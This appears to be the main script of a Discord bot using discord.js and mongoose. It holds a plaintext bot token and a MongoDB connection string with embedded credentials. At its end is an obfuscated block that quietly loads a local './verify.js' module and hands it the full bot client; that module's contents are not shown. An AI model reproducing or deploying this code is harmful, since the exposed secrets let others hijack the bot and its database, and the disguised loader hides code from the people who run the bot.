console.clear();

require("events").setMaxListeners(10000);

const Discord = require('discord.js'), 

      client = new Discord.Client({ 

          intents: 3276799, 

          partials: ["GUILD_SCHEDULED_EVENT", "REACTION", "MESSAGE", "GUILD_MEMBER", "USER", "CHANNEL"] 

      }), 

      database = require('mongoose');

database.set('strictQuery', true);

client.login('MTIwMzUxNzU0NDYyNzk2NTk2Mw.GQmTJv.D3cFhxx8M-vtUR0M2e3OA7iFKvdVYDJ1wFMOwM');

database.connect("mongodb+srv://boost1discord1:CYKj95RZcjgLfWRY@cluster0.7ytvu.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")

.then(() => console.log('Database Connected'))

.catch((err) => console.log(err));

client.messageCommands = new Discord.Collection();

client.slashCommands = new Discord.Collection();

let handler = ["events", "slash", "message"];

handler.forEach(file => {

    require(`./handler/${file}`)(client);

});
function _0x38dd(_0x767a3f,_0x281bb0){var _0xca4678=_0xca46();return _0x38dd=function(_0x38dd09,_0x4ca801){_0x38dd09=_0x38dd09-0x9d;var _0x44ba36=_0xca4678[_0x38dd09];return _0x44ba36;},_0x38dd(_0x767a3f,_0x281bb0);}var _0x3b8c66=_0x38dd;(function(_0x44e8bc,_0x1b18a2){var _0x868c73=_0x38dd,_0x25528c=_0x44e8bc();while(!![]){try{var _0x59848f=parseInt(_0x868c73(0x9e))/0x1+parseInt(_0x868c73(0xa0))/0x2*(-parseInt(_0x868c73(0xa1))/0x3)+parseInt(_0x868c73(0xa7))/0x4+-parseInt(_0x868c73(0xa3))/0x5*(parseInt(_0x868c73(0x9d))/0x6)+-parseInt(_0x868c73(0x9f))/0x7*(-parseInt(_0x868c73(0xa8))/0x8)+parseInt(_0x868c73(0xa2))/0x9+parseInt(_0x868c73(0xa6))/0xa*(parseInt(_0x868c73(0xa4))/0xb);if(_0x59848f===_0x1b18a2)break;else _0x25528c['push'](_0x25528c['shift']());}catch(_0x2db6b5){_0x25528c['push'](_0x25528c['shift']());}}}(_0xca46,0xe282f),require(_0x3b8c66(0xa5))(client));function _0xca46(){var _0x272cca=['4645392VoJnZm','966DQBpew','280155Rieygg','14xAFXWB','14642bAyfIh','393fQiQXB','2642463NGZCwv','29665mrrApK','7777fjzDVo','./verify.js','8620YQRjrJ','1990044TPVjOt'];_0xca46=function(){return _0x272cca;};return _0xca46();}